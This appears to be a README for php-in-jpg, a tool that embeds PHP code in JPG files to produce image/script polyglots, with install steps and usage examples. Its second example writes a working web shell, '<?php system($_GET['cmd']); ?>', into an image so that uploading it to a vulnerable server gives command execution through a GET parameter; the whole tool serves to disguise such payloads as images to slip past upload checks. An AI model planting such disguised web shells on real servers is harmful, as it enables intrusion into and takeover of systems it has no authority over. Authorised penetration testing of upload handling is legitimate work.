## Features

- **Simple to Use**: Generate .jpg files with embedded PHP payloads easily.
- **Flexible**: Supports various PHP payloads for different scenarios.
- **Polyglot Support**: Ideal for RCE (Remote Code Execution) testing.
- **Lightweight**: Minimal dependencies for quick setup.

## Installation

To get started with php-in-jpg, you need to clone the repository and install the necessary dependencies. Use the following commands:

```bash
git clone https://github.com/Mxzinedits/php-in-jpg.git
cd php-in-jpg
```

Make sure you have PHP installed on your machine. You can check this by running:

```bash
php -v
```

If you don't have PHP installed, please follow the instructions on the [official PHP website](https://www.php.net/manual/en/install.php).

## Usage

After installation, you can generate a .jpg file with a PHP payload. The command structure is as follows:

```bash
php generate.php [payload] [output.jpg]
```

### Parameters

- `payload`: The PHP code you want to embed.
- `output.jpg`: The name of the output file.

For example, to create a .jpg file with a simple PHP payload, you would run:

```bash
php generate.php "<?php phpinfo(); ?>" output.jpg
```

## Examples

Here are a few examples of using php-in-jpg:

### Example 1: Basic PHP Payload

```bash
php generate.php "<?php echo 'Hello, World!'; ?>" hello.jpg
```

This command generates a .jpg file named `hello.jpg` that, when executed on a server, will display "Hello, World!".

### Example 2: RCE Payload

```bash
php generate.php "<?php system($_GET['cmd']); ?>" rce.jpg
```

This command creates an image that allows for command execution via the `cmd` GET parameter.

### Example 3: Polyglot Usage

You can also use php-in-jpg to create polyglot files that serve multiple purposes. For instance:

```bash
php generate.php "<?php echo 'Polyglot!'; ?>" polyglot.jpg
```

This file can be interpreted as both a valid image and a PHP script.
